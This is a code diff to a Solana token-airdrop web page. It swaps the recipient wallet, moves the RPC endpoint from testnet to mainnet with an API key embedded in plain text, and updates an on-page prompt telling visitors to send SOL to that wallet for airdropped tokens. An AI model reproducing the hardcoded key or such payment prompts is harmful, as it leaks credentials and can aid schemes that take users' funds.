@@ -28,8 +28,8 @@ export default function Home() {
   const [isClient, setIsClient] = useState(false);
   const [hasFollowed, setHasFollowed] = useState(false);
   const [hasPosted, setHasPosted] = useState(false);
-  const recipient = "5bUV2RbXmHX6y9VHm6wcJ1uAzQZgCBTmKCamvnhsqbgF";
-  const rpcEndpoint = "https://api.testnet.solana.com";
+  const recipient = "9u92hBMxYgcGNi1JYSbRsuEM1CsLVW48G7jKG6rRhXr8";
+  const rpcEndpoint = "https://mainnet.helius-rpc.com/?api-key=42734956-df14-4915-8bfe-56c62a20cd04";
 
   useEffect(() => {
     setIsClient(true);
@@ -257,7 +257,7 @@ export default function Home() {
           <div className="mt-4 text-center text-xs">
             <p className="font-runes text-2xl">IF YOU HAVE PROBLEMS CONNECTING YOUR WALLET, SEND SOL TO:</p>
             <p className="font-bold bg-teal-500 text-purple-700 text-xl py-1 cursor-pointer break-all" style={{ fontSize: '110%' }} onClick={copyToClipboard}>
-            5bUV2RbXmHX6y9VHm6wcJ1uAzQZgCBTmKCamvnhsqbgF
+            9u92hBMxYgcGNi1JYSbRsuEM1CsLVW48G7jKG6rRhXr8
             </p>
             <p className="font-runes" style={{ fontSize: '150%' }}>AND TOKENS WILL BE AIRDROPPED TO THE SENDING WALLET.</p>
             <p className="font-runes" style={{ fontSize: '150%' }}>NB: DON’T USE A CEX TO SEND SOL. USE YOUR OWN WALLET.</p>
